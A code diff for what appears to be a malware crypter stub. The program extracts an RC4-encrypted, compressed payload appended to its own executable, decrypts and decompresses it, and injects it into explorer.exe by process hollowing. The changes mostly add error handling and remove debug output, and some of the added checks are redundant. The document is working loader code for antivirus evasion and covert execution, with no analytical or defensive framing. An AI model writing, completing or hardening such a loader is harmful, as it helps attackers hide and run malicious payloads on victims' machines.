@@ -27,25 +27,65 @@ VOID DbgPrint(char* msg)
 bool DecryptPE(std::vector<BYTE>& bin)
 {
 	std::vector<BYTE> pvKey(bin.end() - KEY_LEN, bin.end());
+	if (pvKey.size() < 1)
+	{
+		return false;
+	}
 	bin.erase(bin.end() - KEY_LEN, bin.end());
-	CRC4* rc4;
+	if (bin.size() < 1)
+	{
+		return false;
+	}
+	CRC4* rc4 = nullptr;
 	rc4 = new CRC4{};
 	rc4->Initialize(&pvKey.front(), KEY_LEN);
+	if (rc4 == nullptr)
+	{
+		delete rc4;
+		return false;
+	}
 	rc4->RC4(&bin.front(), bin.size());
+	if (bin.size() < 1)
+	{
+		delete rc4;
+		return false;
+	}
 	delete rc4;
 	return true;
 }
 
 bool DecompressPE(std::vector<BYTE>& bin)
 {
-	qlz_state_decompress* state_decompress{};
-	state_decompress = new qlz_state_decompress;
+	qlz_state_decompress* state_decompress = nullptr;
+	state_decompress = new qlz_state_decompress{};
+	if (state_decompress == nullptr)
+	{
+		delete state_decompress;
+		return false;
+	}
 	size_t dsize = qlz_size_decompressed((char*)& bin.front());
+	if (dsize < 1)
+	{
+		delete state_decompress;
+		return false;
+	}
 	char* dbin{};
 	dbin = new char[dsize];
 	size_t usize = qlz_decompress((char*)& bin.front(), dbin, state_decompress);
+	if (usize < 1)
+	{
+		delete state_decompress;
+		delete[] dbin;
+		return false;
+	}
 	bin.resize(usize);
 	std::copy(dbin, dbin + usize, &bin.front());
+	if (bin.size() < 1)
+	{
+		delete state_decompress;
+		delete[] dbin;
+		return false;
+	}
 	delete state_decompress;
 	delete[] dbin;
 	return true;
@@ -97,7 +137,6 @@ PE_FILE ParsePE(const char* PE)
 
 	return pefile;
 }
-
 
 // Based on John Leitch's paper "Process Hollowing"
 BOOL ProcessReplacement(TCHAR* target, std::vector<BYTE> bin)
@@ -330,30 +369,59 @@ BOOL ProcessReplacement(TCHAR* target, std::vector<BYTE> bin)
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
 	USES_CONVERSION;
+	TCHAR* target = A2T("C:\\Windows\\explorer.exe");
+
 	TCHAR szFileName[MAX_PATH];
 	GetModuleFileName(NULL, szFileName, MAX_PATH);
-	std::vector<BYTE> n_stub = OpenPE(T2A(szFileName));
 
-	//std::vector<BYTE> n_stub = OpenPE("C:\\Users\\john\\Desktop\\testoutput.exe");
+	std::vector<BYTE> n_stub = OpenPE(T2A(szFileName));
+	if (n_stub.size() < 1)
+	{
+		return 1;
+	}
+
 	std::vector<BYTE> n_vbSize(n_stub.end() - sizeof(size_t), n_stub.end());
+	if (n_vbSize.size() < 1)
+	{
+		return 1;
+	}
 	n_stub.erase(n_stub.end() - sizeof(size_t), n_stub.end());
+	if (n_stub.size() < 1)
+	{
+		return 1;
+	}
 
 	size_t n_stSize = *reinterpret_cast<size_t*>(&n_vbSize.front());
-	//std::cout << "[Stored] Size: " << n_stSize << std::endl;
-	//std::cout << "[Stub+Bin] Size: " << n_stub.size() << std::endl;
+	if (n_stSize < 1)
+	{
+		return 1;
+	}
 
 	std::vector<BYTE> n_bin(n_stub.end() - n_stSize, n_stub.end());
+	if (n_bin.size() < 1)
+	{
+		return 1;
+	}
 	n_stub.erase(n_stub.end() - n_stSize, n_stub.end());
-	//std::cout << "[Stub] Size: " << n_stub.size() << std::endl;
-	//std::cout << "[Bin] Size: " << n_bin.size() << std::endl;
+	if (n_stub.size() < 1)
+	{
+		return 1;
+	}
 
-	DecryptPE(n_bin);
-	//std::cout << "[Decryption] Size: " << n_bin.size() << std::endl;
+	if (!DecryptPE(n_bin))
+	{
+		return 1;
+	}
 
-	DecompressPE(n_bin);
-	//std::cout << "[Decompression] Size: " << n_bin.size() << std::endl;
+	if (!DecompressPE(n_bin))
+	{
+		return 1;
+	}
 
-	ProcessReplacement(A2T("C:\\Windows\\explorer.exe"), n_bin);
+	if (!ProcessReplacement(target, n_bin))
+	{
+		return 1;
+	}
 
 	return 0;
 }
